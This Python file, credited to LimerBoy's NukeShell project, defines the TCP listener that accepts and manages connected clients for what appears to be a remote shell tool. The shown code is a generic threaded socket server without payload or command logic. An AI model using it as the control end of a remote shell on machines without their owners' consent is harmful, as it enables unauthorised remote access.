#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Author : LimerBoy
# github.com/LimerBoy/NukeShell

# Import modules
from sys import exit
from time import sleep
from colorama import Fore
from threading import Thread
from Core.clients import Client, ClientsManager
from socket import socket, AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR

""" TCP server class """
class ServerListen:
    """ Constructor """
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.ServerStopped = False
        self.server = self.InitServer(host, port)
        Thread(target=self.AcceptClients, daemon=True).start()

    # Stop server
    def StopServer(self):
        self.ServerStopped = True
        ConnectedClients = ClientsManager.GetConnectedClients()
        clients = len(ConnectedClients)
        print(f"\n{Fore.RED}[Server]{Fore.WHITE} Disconnecting {clients} clients ...")
        # Disconnect all clients
        for client in ConnectedClients:
            Thread(target=client.Disconnect).start()
        # Wait for all clients to disconnect
        while len(ClientsManager.GetConnectedClients()) > 0:
            sleep(0.2)
        # Stop tcp server
        print(f"{Fore.RED}[Server]{Fore.WHITE} Stopping server ...")
        self.server.shutdown(SHUT_RDWR)
        self.server.close()
        exit(1)

    # Initialize server socket
    @staticmethod
    def InitServer(host="0.0.0.0", port=5125) -> socket:
        # Create sockets
        server = socket(AF_INET, SOCK_STREAM)
        # Settings
        server.settimeout(50)
        server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        # Bind socket
        try:
            server.bind((host, port))
            server.listen(5)
            print(f"{Fore.GREEN}[Server]{Fore.WHITE} Listening at {host}:{port} ...{Fore.RESET}")
        except OSError as e:
            print(f"{Fore.RED}[Server]{Fore.WHITE} Failed to bind to {host}:{port}", Fore.RESET, e)
            exit(1)
        return server

    # Accept all connections
    def AcceptClients(self):
        while not self.ServerStopped:
            try:
                connection, address = self.server.accept()
                Thread(target=Client, args=(connection, address), daemon=True).start()
            except OSError as e:
                if self.ServerStopped:
                    return
                # Check if 'address' is defined, if not set it to a placeholder
                if 'address' not in locals():
                    address = ('Unknown', 'Unknown')
                print(f"{Fore.RED}[Server]{Fore.WHITE} Failed to accept client from {address}", Fore.RESET, e)
                sleep(0.5)  # Small delay before retrying to avoid busy-waiting
